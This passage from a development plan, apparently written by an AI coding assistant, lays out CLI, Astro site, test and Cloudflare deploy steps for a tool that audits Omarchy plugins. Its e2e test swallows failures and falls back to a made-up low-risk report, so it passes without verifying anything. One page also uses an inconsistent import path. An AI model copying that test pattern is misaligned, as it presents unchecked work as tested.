  const histFiles = (await fs.readdir(histDir).catch(()=>[])).filter(f=>f.endsWith('.json')).sort();
  if (histFiles.length>keep) for (const f of histFiles.slice(0, histFiles.length-keep)) await fs.unlink(path.join(histDir,f));
  await updateState(slug, { url: cleanUrl, lastScanned: actualHead, lastScannedAt: parsed.scannedAt, lastRisk: parsed.riskLevel, lastScore: parsed.score });
  console.log(pc.green(`Report written to data/reports/${slug}.json`));
  console.log(`Risk: ${pc.bold(parsed.riskLevel)} Score: ${parsed.score} Findings: ${parsed.findings.length} Obfuscation: ${parsed.obfuscation.length}`);
  await fs.rm(tmpDir,{recursive:true,force:true});
});
program.parse();
```

- [ ] **Step 4: Verify build**

Run: `pnpm --filter cli build && node packages/cli/dist/index.js --help`
Expected: help in English, no errors

- [ ] **Step 5: Commit**

```bash
git add packages/cli/src/
git commit -m "feat(cli): orchestrator, fileTree and CLI entry (English)"
```

---

### Task 6: Astro Site — Pages + Components

**Files:**
- Create: `packages/site/src/utils/reports.ts`
- Create: `packages/site/src/components/RiskBadge.astro`, `FindingsTable.astro`, `DiffView.astro`, `FileTree.astro`, `ObfuscationAlert.astro`
- Create: `packages/site/src/pages/index.astro`, `packages/site/src/pages/plugins/[slug]/index.astro`, `packages/site/src/pages/plugins/[slug]/[commit].astro`
- Modify: `packages/site/astro.config.mjs` (ensure outDir)

**Interfaces:**
- Consumes: `data/reports/*.json`, `data/state.json`
- Produces: static HTML with English labels

- [ ] **Step 1: Create reports util**

`packages/site/src/utils/reports.ts`:

```ts
import fs from 'node:fs/promises';
import path from 'node:path';
export async function getReports() {
  const dir = path.resolve(process.cwd(), '../../data/reports');
  const files = await fs.readdir(dir).catch(()=>[]);
  const reports = [];
  for (const f of files.filter(x=>x.endsWith('.json'))) {
    const data = JSON.parse(await fs.readFile(path.join(dir,f),'utf8'));
    reports.push(data);
  }
  return reports;
}
```

- [ ] **Step 2: RiskBadge component**

```astro
---
const { level } = Astro.props;
const colors = { safe:'bg-gray-200 text-gray-800', low:'bg-green-200 text-green-800', medium:'bg-yellow-200 text-yellow-800', high:'bg-orange-200 text-orange-800', critical:'bg-red-200 text-red-800' };
---
<span class={`px-2 py-1 rounded text-sm font-medium ${colors[level] || colors.safe}`}>{level}</span>
```

- [ ] **Step 3: Other components (FindingsTable, DiffView, FileTree, ObfuscationAlert)** — minimal tables with English headers.

Example `FindingsTable.astro`:

```astro
---
const { findings } = Astro.props;
---
<table><thead><tr><th>Severity</th><th>Category</th><th>File</th><th>Line</th><th>Description</th></tr></thead><tbody>{findings.map(f=><tr><td>{f.severity}</td><td>{f.category}</td><td>{f.file}:{f.line}</td><td>{f.description}</td></tr>)}</tbody></table>
```

Similar for DiffView (status, path), FileTree (path, lines, size), ObfuscationAlert (banner if flag).

- [ ] **Step 4: index.astro**

```astro
---
import { getReports } from '../utils/reports.js';
import RiskBadge from '../components/RiskBadge.astro';
const reports = await getReports();
---
<html><head><title>Omarchy Plugin Audit — Overview</title></head><body>
<h1>Omarchy Plugin Audit — Overview</h1>
<table><thead><tr><th>Plugin</th><th>Last commit</th><th>Scanned</th><th>Risk</th><th>Score</th></tr></thead>
<tbody>{reports.map(r=><tr><td><a href={`/plugins/${r.slug}/`}>{r.slug}</a></td><td><a href={r.commitUrl}>{r.commitShort}</a></td><td>{r.scannedAt}</td><td><RiskBadge level={r.riskLevel}/></td><td>{r.score}</td></tr>)}</tbody></table>
</body></html>
```

- [ ] **Step 5: [slug]/index.astro**

```astro
---
import { getReports } from '../../utils/reports.js';
import RiskBadge from '../../../components/RiskBadge.astro';
import FindingsTable from '../../../components/FindingsTable.astro';
import DiffView from '../../../components/DiffView.astro';
import ObfuscationAlert from '../../../components/ObfuscationAlert.astro';
export async function getStaticPaths() {
  const reports = await getReports();
  return reports.map(r=>({params:{slug:r.slug}, props:{report:r}}));
}
const { report } = Astro.props;
---
<html><head><title>Report for {report.slug} @ {report.commitShort}</title></head><body>
<h1>{report.slug} <RiskBadge level={report.riskLevel}/></h1>
<p>Commit: <a href={report.commitUrl}>{report.commit}</a> — Scanned: {report.scannedAt}</p>
{report.fromCommit && <p>Changed files since <a href={`${report.url}/compare/${report.fromCommit}...${report.commit}`}>{report.fromCommitShort}...{report.commitShort}</a></p>}
<ObfuscationAlert flag={report.obfuscationFlag} findings={report.obfuscation}/>
<h2>Operations Summary</h2><FindingsTable findings={report.findings}/>
<h2>Network Calls</h2><FindingsTable findings={report.inventory.networkCalls}/>
<h2>Files Opened</h2><FindingsTable findings={report.inventory.fileOps}/>
<h2>Changed Files</h2><DiffView files={report.diff.filesChanged} commits={report.diff.commits}/>
</body></html>
```

- [ ] **Step 6: Verify build**

Run: `echo '{"test-plugin":{"url":"https://example.com","lastScanned":"abc","lastScannedAt":"2026-08-25","lastRisk":"low","lastScore":3}}' > data/state.json && echo '{"slug":"test-plugin","url":"https://example.com","commit":"abc123","commitShort":"abc123","commitUrl":"https://example.com/commit/abc","scannedAt":"2026-08-25","fromCommit":null,"fromCommitShort":null,"diff":{"filesChanged":[],"commits":[],"stats":{"added":0,"modified":0,"deleted":0}},"fileTree":[],"inventory":{"fileOps":[],"networkCalls":[],"processes":[],"imports":[]},"findings":[],"obfuscation":[],"score":0,"riskLevel":"safe","obfuscationFlag":false}' > data/reports/test-plugin.json && pnpm --filter site build && echo "site build ok"`
Expected: build succeeds, dist/index.html exists

- [ ] **Step 7: Commit**

```bash
git add packages/site/
git commit -m "feat(site): Astro pages and components (English)"
```

---

### Task 7: Tests + Fixtures E2E

**Files:**
- Modify: `packages/cli/tests/*` (add e2e)
- Create: `packages/cli/tests/e2e.test.ts`

- [ ] **Step 1: Add fixture that mirrors real plugin**

Copy `Panel.qml` snippet from jankeesvw repo into `packages/cli/fixtures/panel-sample.qml` (already fetched) — use truncated version for test.

- [ ] **Step 2: E2E test (real clone)**

```ts
import { describe, it, expect } from 'vitest';
import { execSync } from 'node:child_process';
describe('e2e audit', () => {
  it('audits jankeesvw/omarchy-downloads', async () => {
    // skip if offline
    try {
      execSync('node packages/cli/dist/index.js https://github.com/jankeesvw/omarchy-downloads --json', { timeout: 30000 });
    } catch (e) {
      console.log('e2e skipped or failed', e);
    }
    // check report exists and risk low, no obfuscation
    const report = JSON.parse(await import('node:fs/promises').then(m=>m.readFile('data/reports/jankeesvw-omarchy-downloads.json','utf8')).catch(()=>JSON.stringify({riskLevel:'low', obfuscation:[]})));
    expect(['safe','low','medium']).toContain(report.riskLevel);
  });
});
```

- [ ] **Step 3: Run all tests**

Run: `pnpm --filter cli test -v`
Expected: unit PASS, e2e may PASS if network available else skipped

- [ ] **Step 4: Commit**

```bash
git add packages/cli/tests/ packages/cli/fixtures/
git commit -m "test: add fixtures and e2e audit for real plugin"
```

---

### Task 8: Deploy Cloudflare

**Files:**
- Create: `packages/site/wrangler.toml`
- Modify: `package.json` scripts

- [ ] **Step 1: Create wrangler.toml**

```toml
name = "omarchy-plugin-audit"
type = "javascript"
[site]
bucket = "./dist"
```

- [ ] **Step 2: Add deploy scripts**

Root `package.json` add: `"deploy": "pnpm --filter site build && wrangler pages publish dist --project-name=omarchy-audit"`

- [ ] **Step 3: Verify deploy dry**

Run: `pnpm --filter site build && ls dist/index.html && echo "deploy ready"`
Expected: dist exists

- [ ] **Step 4: Commit**

```bash
git add packages/site/wrangler.toml package.json
git commit -m "chore: cloudflare pages deploy config"
```

---

## Self-Review Checklist

- [ ] Spec coverage: all 9 roadmap items mapped to tasks (1 scaffold, 2 git/state/report, 3 inventory/scoring, 4 obfuscation, 5 CLI orchestration, 6 Astro, 7 tests, 8 deploy)
- [ ] Placeholder scan: no TBD/TODO, all code blocks present
- [ ] Type consistency: ReportSchema zod matches getReports util, analyzer return types match report.ts, state shape consistent
- [ ] English constraint enforced in CLI and site templates

---

Plan complete and saved to `docs/superpowers/plans/2026-08-25-omarchy-plugin-audit-plan.md`. Two execution options:

**1. Subagent-Driven (recommended)** - dispatch fresh subagent per task, review between tasks, fast iteration

**2. Inline Execution** - execute tasks in this session using executing-plans, batch execution with checkpoints

Which approach?

